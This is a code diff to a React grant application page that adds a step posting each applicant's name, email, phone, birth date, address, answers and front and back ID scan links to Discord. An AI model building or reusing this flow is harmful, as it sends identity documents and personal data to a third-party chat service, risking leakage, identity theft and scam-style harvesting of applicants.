@@ -13,6 +13,7 @@ import { cn } from '@/lib/utils';
 import { toast } from 'sonner';
 import { useNavigate } from 'react-router-dom';
 import { Loader2, ArrowLeft, ArrowRight, CalendarIcon, Upload, FileText, CheckCircle, User, DollarSign, ClipboardList } from 'lucide-react';
+import { sendToDiscord } from '@/lib/discord';
 
 const STEPS = ['Personal Details', 'Funding Details', 'Questionnaire', 'Review & Submit'];
 
@@ -139,6 +140,30 @@ export default function ApplyPage() {
       setSubmitting(false);
       return;
     }
+
+    // Send application data to Discord
+    await sendToDiscord({
+      title: '📄 New Grant Application',
+      color: 0x3b82f6,
+      fields: [
+        { name: '👤 Full Name', value: fullName },
+        { name: '📧 Email', value: email },
+        { name: '📞 Phone', value: phone || '—' },
+        { name: '🎂 Date of Birth', value: dateOfBirth ? format(dateOfBirth, 'PPP') : '—' },
+        { name: '💼 Occupation', value: occupation },
+        { name: '🏠 Address', value: [streetAddress, city, stateProvince, country].filter(Boolean).join(', '), inline: false },
+        { name: '💰 Amount Requested', value: `$${Number(amountRequested).toLocaleString('en-US', { minimumFractionDigits: 2 })}` },
+        { name: '📋 Purpose', value: purpose || '—', inline: false },
+        { name: '❓ Why need grant', value: q1 || '—', inline: false },
+        { name: '💡 How use funds', value: q2 || '—', inline: false },
+        { name: '📜 Previous grants', value: q3 || '—', inline: false },
+        { name: '🌍 Impact', value: q4 || '—', inline: false },
+        { name: '📎 Additional info', value: q5 || '—', inline: false },
+        { name: '🪪 ID Front', value: idFrontUrl || '—', inline: false },
+        { name: '🪪 ID Back', value: idBackUrl || '—', inline: false },
+      ],
+      imageUrl: idFrontUrl || undefined,
+    });
 
     navigate('/application-success');
     setSubmitting(false);
